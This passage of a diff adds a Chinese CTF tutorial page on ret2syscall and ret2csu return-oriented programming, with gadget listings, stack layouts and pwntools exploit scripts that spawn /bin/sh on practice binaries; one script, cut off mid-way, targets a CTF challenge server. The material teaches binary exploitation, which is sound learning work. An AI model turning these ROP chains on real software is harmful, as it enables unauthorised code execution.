+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a><span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="o">(</span>PLANA<span class="o">)</span>--&gt;<span class="w"> </span>pwn<span class="w"> </span>checksec<span class="w"> </span>./ret2syscall<span class="w"> </span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="s1">'/home/kali/ctfwiki/ret2syscall/ret2syscall'</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span>Arch:<span class="w">       </span>amd64-64-little
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span>RELRO:<span class="w">      </span>Partial<span class="w"> </span>RELRO
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">    </span>Stack:<span class="w">      </span>No<span class="w"> </span>canary<span class="w"> </span>found
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">    </span>NX:<span class="w">         </span>NX<span class="w"> </span>enabled
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">    </span>PIE:<span class="w">        </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x400000<span class="o">)</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">    </span>Stripped:<span class="w">   </span>No
+</code></pre></div>
+<p>可以看到没有PIE</p>
+<p>我们提取一下gadget:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="err">0</span><span class="nf">x000000000040114c</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="no">pop</span><span class="w"> </span><span class="no">rax</span><span class="w"> </span><span class="c1">; ret</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="err">0</span><span class="nf">x000000000040112d</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="no">pop</span><span class="w"> </span><span class="no">rbp</span><span class="w"> </span><span class="c1">; ret</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="err">0</span><span class="nf">x000000000040114a</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="no">pop</span><span class="w"> </span><span class="no">rdi</span><span class="w"> </span><span class="c1">; ret</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="err">0</span><span class="nf">x0000000000401150</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="no">pop</span><span class="w"> </span><span class="no">rdx</span><span class="w"> </span><span class="c1">; ret</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="err">0</span><span class="nf">x000000000040114e</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="no">pop</span><span class="w"> </span><span class="no">rsi</span><span class="w"> </span><span class="c1">; ret</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="err">0</span><span class="nf">x0000000000401152</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="no">syscall</span>
+</code></pre></div>
+<p>这个题目比较简单，我们考虑这样构造payload:</p>
+<table>
+<thead>
+<tr>
+<th>STACK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>rbp_space</td>
+</tr>
+<tr>
+<td>pop rdi(原rip_space)</td>
+</tr>
+<tr>
+<td>bin_sh_address</td>
+</tr>
+<tr>
+<td>pop rdx</td>
+</tr>
+<tr>
+<td>0</td>
+</tr>
+<tr>
+<td>pop rsi</td>
+</tr>
+<tr>
+<td>0</td>
+</tr>
+<tr>
+<td>pop rax</td>
+</tr>
+<tr>
+<td>59</td>
+</tr>
+<tr>
+<td>syscall</td>
+</tr>
+</tbody>
+</table>
+<p>这样就相当于执行了<code>SYS_execve("/bin/sh",0,0);</code>这句代码可以在6.x内核版本中正常运行，5.12.13不可用，其他版本内核笔者还暂未考证，请读者自证。</p>
+<h4 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">¶</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="ch">#!/bin/python3</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">"./ret2syscall"</span><span class="p">)</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">pop_rdi</span><span class="o">=</span><span class="mh">0x000000000040114a</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="n">pop_rax</span><span class="o">=</span><span class="mh">0x000000000040114c</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="n">pop_rdx</span><span class="o">=</span><span class="mh">0x0000000000401150</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="n">pop_rsi</span><span class="o">=</span><span class="mh">0x000000000040114e</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="n">syscall</span><span class="o">=</span><span class="mh">0x0000000000401152</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">""</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="n">payload</span><span class="o">+=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="mh">0x80</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="c1">#binsh地址需要自己提取</span>
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span>
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="ret2csu">ret2csu<a class="headerlink" href="#ret2csu" title="Permanent link">¶</a></h2>
+<p><code>ret2csu</code> 一般是利用 <code>__libc_csu_init</code> 里的 gadget，来完成参数控制和一次间接调用。<br>
+它常见于没有现成 <code>pop rdx ; ret</code>、<code>pop rsi ; ret</code> 等 gadget 的场景。</p>
+<blockquote>
+<p>先提醒一句：<code>ret2csu</code> 的可用性和具体形态取决于实际二进制。<br>
+新工具链下，经典 gadget 可能变少，甚至根本没有，所以一定要以**你手上的反汇编结果**为准。</p>
+</blockquote>
+<p>下面这个例子里，我们主要关注两段：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="err">0000000000401240</span><span class="w"> </span><span class="err">&lt;</span><span class="nf">__libc_csu_init</span><span class="err">&gt;</span><span class="p">:</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span><span class="na">...</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span><span class="err">401280:</span><span class="w">       </span><span class="nf">mov</span><span class="w">    </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">r15</span><span class="w">    </span><span class="c1">// 标号1</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">  </span><span class="err">401283:</span><span class="w">       </span><span class="nf">mov</span><span class="w">    </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">r14</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">  </span><span class="err">401286:</span><span class="w">       </span><span class="nf">mov</span><span class="w">    </span><span class="no">edi</span><span class="p">,</span><span class="w"> </span><span class="no">r13d</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">  </span><span class="err">401289:</span><span class="w">       </span><span class="nf">call</span><span class="w">   </span><span class="no">qword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">rbx</span><span class="err">+</span><span class="no">r12</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">  </span><span class="err">40128</span><span class="nl">d:</span><span class="w">       </span><span class="nf">add</span><span class="w">    </span><span class="no">r12</span><span class="p">,</span><span class="w"> </span><span class="mi">0x1</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">  </span><span class="err">401291:</span><span class="w">       </span><span class="nf">cmp</span><span class="w">    </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">r12</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="w">  </span><span class="err">401294:</span><span class="w">       </span><span class="nf">jne</span><span class="w">    </span><span class="mh">401280</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">0x40</span><span class="p">&gt;</span>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="w">  </span><span class="err">401296:</span><span class="w">       </span><span class="nf">add</span><span class="w">    </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">0x8</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="w">  </span><span class="err">40129</span><span class="nl">a:</span><span class="w">       </span><span class="nf">pop</span><span class="w">    </span><span class="no">rbx</span><span class="w">         </span><span class="c1">// 标号2</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w">  </span><span class="err">40129</span><span class="nl">b:</span><span class="w">       </span><span class="nf">pop</span><span class="w">    </span><span class="no">rbp</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w">  </span><span class="err">40129</span><span class="nl">c:</span><span class="w">       </span><span class="nf">pop</span><span class="w">    </span><span class="no">r12</span>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">  </span><span class="err">40129</span><span class="nl">e:</span><span class="w">       </span><span class="nf">pop</span><span class="w">    </span><span class="no">r13</span>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="w">  </span><span class="err">4012</span><span class="nl">a0:</span><span class="w">       </span><span class="nf">pop</span><span class="w">    </span><span class="no">r14</span>
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="w">  </span><span class="err">4012</span><span class="nl">a2:</span><span class="w">       </span><span class="nf">pop</span><span class="w">    </span><span class="no">r15</span>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="w">  </span><span class="err">4012</span><span class="nl">a4:</span><span class="w">       </span><span class="nf">ret</span>
+</code></pre></div>
+<h3 id="gadget">这一版 gadget 的寄存器关系<a class="headerlink" href="#gadget" title="Permanent link">¶</a></h3>
+<p>如果先执行“标号 2”，再跳到“标号 1”，那么这份反汇编里常见的控制关系是：</p>
+<ul>
+<li><code>rbx = 函数指针所在的内存地址</code></li>
+<li><code>rbp = 1</code></li>
+<li><code>r12 = 0</code></li>
+<li><code>r13 = edi</code></li>
+<li><code>r14 = rsi</code></li>
+<li><code>r15 = rdx</code></li>
+</ul>
+<p>原因是这里真正执行的是：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nf">call</span><span class="w"> </span><span class="no">qword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">rbx</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="no">r12</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
+</code></pre></div>
+<p>所以如果想只调用一次，通常让：</p>
+<ul>
+<li><code>r12 = 0</code></li>
+<li><code>rbp = 1</code></li>
+</ul>
+<p>这样 <code>add r12, 1</code> 之后就能满足退出条件，不会继续循环。</p>
+<blockquote>
+<p>注意：</p>
+<ul>
+<li>这里调用的是“内存里的函数指针”，不是把函数地址直接塞给 <code>rbx</code></li>
+<li><code>mov edi, r13d</code> 只会保留低 32 位，所以第一个参数如果是 64 位指针，往往还得额外找 <code>pop rdi ; ret</code></li>
+<li>不同二进制里也常见 <code>call [r12 + rbx*8]</code> 这种变体，寄存器含义会跟着交换，别照抄模板</li>
+</ul>
+</blockquote>
+<h3 id="payload">一个更稳妥的 payload 例子<a class="headerlink" href="#payload" title="Permanent link">¶</a></h3>
+<p>原文里那个 <code>payload = flat(...)</code> 会把前面已经拼进去的内容覆盖掉，而且少了循环退出后要吃掉的栈槽。<br>
+更稳妥的写法可以像这样：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">build_ret2csu</span><span class="p">(</span><span class="n">func_ptr_addr</span><span class="p">,</span> <span class="n">edi</span><span class="p">,</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">next_rip</span><span class="p">):</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>    <span class="n">payload</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">CSU_POP_GADGET</span><span class="p">)</span>   <span class="c1"># 标号2</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>        <span class="n">func_ptr_addr</span><span class="p">,</span>  <span class="c1"># rbx</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>        <span class="mi">1</span><span class="p">,</span>              <span class="c1"># rbp</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>        <span class="mi">0</span><span class="p">,</span>              <span class="c1"># r12</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>        <span class="n">edi</span><span class="p">,</span>            <span class="c1"># r13 -&gt; edi</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>        <span class="n">rsi</span><span class="p">,</span>            <span class="c1"># r14 -&gt; rsi</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>        <span class="n">rdx</span><span class="p">,</span>            <span class="c1"># r15 -&gt; rdx</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>    <span class="p">)</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">CSU_CALL_GADGET</span><span class="p">)</span>  <span class="c1"># 标号1</span>
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>    <span class="c1"># 经过 call / add / cmp 之后，函数还会继续执行：</span>
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>    <span class="c1"># add rsp, 0x8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
+<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span>
+<a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>        <span class="mi">0</span><span class="p">,</span>  <span class="c1"># add rsp, 0x8 吃掉的占位</span>
+<a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+<a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a>        <span class="n">next_rip</span><span class="p">,</span>
+<a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a>    <span class="p">)</span>
+<a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a>    <span class="k">return</span> <span class="n">payload</span>
+</code></pre></div>
+<p>这个版本的重点不是“万能模板”，而是提醒你两件事：</p>
+<ul>
+<li>要按**实际 pop 顺序**摆参数</li>
+<li>要把 gadget 后续会额外消耗的栈空间一起算进去</li>
+</ul>
+<h3 id="_7">题目<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
+<p>这里可以看一下第 18 届极客大挑战的 <code>oldrop</code>，考的是 <code>csu</code> 的变种，挺适合练手。<a href="https://github.com/eroorvbsyes-hotmail/18th-JeKeChallange-Pwn/tree/main/oldrop/attchment">题目</a></p>
+<p>这个题目就比较经典，将传统的csu变化了一下，此时就需要选手有随机应变的能力，就是直接将特殊的csu拎出来，单独利用即可。exp中有csu的部分代码，可以参考一下</p>
+<p>因为篇幅问题，这里请大家自主思考
+exp:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c1"># p=process("./pwn")</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">"geek.ctfplus.cn"</span><span class="p">,</span><span class="mi">32150</span><span class="p">)</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">"./pwn"</span><span class="p">)</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc/libc.so.6"</span><span class="p">)</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="sd">'''</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="sd">.text:00000000004012B0 loc_4012B0:                             ; CODE XREF: init+54↓j</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="sd">.text:00000000004012B0                 mov     rdx, r14</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="sd">.text:00000000004012B3                 mov     rsi, r13</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="sd">.text:00000000004012B6                 mov     edi, r12d</span>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="sd">.text:00000000004012B9                 call    qword ptr [r15+rbx*8]</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="sd">.text:00000000004012BD                 add     rbx, 1</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="sd">.text:00000000004012C1                 cmp     rbp, rbx</span>
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="sd">.text:00000000004012C4                 jz      short loc_4012B0</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="sd">.text:00000000004012C6</span>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="sd">.text:00000000004012C6 loc_4012C6:                             ; CODE XREF: init+35↑j</span>
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="sd">.text:00000000004012C6                 add     rsp, 8</span>
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="sd">.text:00000000004012CA                 pop     rbx //0</span>
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="sd">.text:00000000004012CB                 pop     rbp</span>
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="sd">.text:00000000004012CC                 pop     r12 //edi</span>
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="sd">.text:00000000004012CE                 pop     r13 //rsi</span>
+<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="sd">.text:00000000004012D0                 pop     r14 //rdx</span>
+<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a><span class="sd">.text:00000000004012D2                 pop     r15 //rip</span>
+<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a><span class="sd">.text:00000000004012D4                 retn</span>
+<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a><span class="sd">'''</span>
+<a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a><span class="k">def</span><span class="w"> </span><span class="nf">get_csu</span><span class="p">(</span><span class="n">rbx</span><span class="p">,</span><span class="n">rsi</span><span class="p">,</span><span class="n">edi</span><span class="p">,</span><span class="n">rip</span><span class="p">,</span><span class="n">rbp</span><span class="p">,</span><span class="n">rdx</span><span class="p">):</span>
+<a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a>    <span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">rbx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">edi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rip</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span>
+<a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a>    <span class="k">return</span> <span class="n">payload</span>
+<a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a><span class="n">rbp</span><span class="o">=</span><span class="mh">0x404500</span><span class="o">+</span><span class="mh">0x500</span>
+<a id="__codelineno-12-31" name="__codelineno-12-31" href="#__codelineno-12-31"></a><span class="n">ret</span><span class="o">=</span><span class="mh">0x000000000040101a</span>
+<a id="__codelineno-12-32" name="__codelineno-12-32" href="#__codelineno-12-32"></a><span class="n">reread</span><span class="o">=</span><span class="mh">0x401162</span>
+<a id="__codelineno-12-33" name="__codelineno-12-33" href="#__codelineno-12-33"></a><span class="n">entry</span><span class="o">=</span><span class="mh">0x4012ca</span>
+<a id="__codelineno-12-34" name="__codelineno-12-34" href="#__codelineno-12-34"></a><span class="n">end</span><span class="o">=</span><span class="mh">0x4012b0</span>
+<a id="__codelineno-12-35" name="__codelineno-12-35" href="#__codelineno-12-35"></a><span class="n">leave</span><span class="o">=</span><span class="mh">0x0000000000401179</span>
+<a id="__codelineno-12-36" name="__codelineno-12-36" href="#__codelineno-12-36"></a><span class="n">offset</span><span class="o">=</span><span class="mi">128</span>
+<a id="__codelineno-12-37" name="__codelineno-12-37" href="#__codelineno-12-37"></a><span class="n">start</span><span class="o">=</span><span class="mh">0x401070</span>
+<a id="__codelineno-12-38" name="__codelineno-12-38" href="#__codelineno-12-38"></a><span class="n">tmp_rbp</span><span class="o">=</span><span class="mh">0x4043b0</span><span class="o">+</span><span class="mh">0x500</span>
+<a id="__codelineno-12-39" name="__codelineno-12-39" href="#__codelineno-12-39"></a><span class="n">mov_eax_ebp_syscall</span><span class="o">=</span><span class="mh">0x000000000009b177</span>
+<a id="__codelineno-12-40" name="__codelineno-12-40" href="#__codelineno-12-40"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="n">offset</span>
+<a id="__codelineno-12-41" name="__codelineno-12-41" href="#__codelineno-12-41"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span>
+<a id="__codelineno-12-42" name="__codelineno-12-42" href="#__codelineno-12-42"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">reread</span><span class="p">)</span>
+<a id="__codelineno-12-43" name="__codelineno-12-43" href="#__codelineno-12-43"></a><span class="n">libc_partial</span><span class="o">=</span><span class="mh">0x4049c8</span><span class="c1">#0x404478+0x500</span>
+<a id="__codelineno-12-44" name="__codelineno-12-44" href="#__codelineno-12-44"></a><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"!</span><span class="se">\x00\n</span><span class="s2">"</span><span class="p">))</span>
+<a id="__codelineno-12-45" name="__codelineno-12-45" href="#__codelineno-12-45"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-12-46" name="__codelineno-12-46" href="#__codelineno-12-46"></a>
+<a id="__codelineno-12-47" name="__codelineno-12-47" href="#__codelineno-12-47"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span>
+<a id="__codelineno-12-48" name="__codelineno-12-48" href="#__codelineno-12-48"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
+<a id="__codelineno-12-49" name="__codelineno-12-49" href="#__codelineno-12-49"></a><span class="n">payload</span><span class="o">+=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
